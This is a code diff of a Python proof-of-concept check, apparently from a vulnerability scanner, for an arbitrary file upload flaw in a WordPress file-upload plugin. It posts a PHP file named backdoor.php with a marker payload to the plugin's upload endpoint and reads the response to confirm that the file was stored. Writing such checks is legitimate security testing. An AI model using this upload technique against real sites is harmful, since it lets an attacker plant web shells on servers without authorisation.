@@ -34,11 +34,13 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
             path = "/wp-content/plugins/work-the-flow-file-upload/public/assets/jQuery-File-Upload-9.5.0/server/php/index.php"
             payload = '{target}'.format(target=self.target) + path
-            filename = "Content-Disposition: backdoor.php"
+            filename = {
+                "Content-Disposition": "backdoor.php"
+            }
             shell = "<?php echo md5(123)?>"
-            code,res, _, _ = hh.http('-H \'%s\' -d \'%s\' %s' % (filename, shell, payload))
-                       
-            if code == 200 and '202cb962ac59075b964b07152d234b70' in res:
+            req = requests.post(payload, headers=filename, data=shell)
+
+            if req.status_code == 200 and '202cb962ac59075b964b07152d234b70' in req.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(target=self.target,name=self.vuln.name))
 
         except Exception, e:
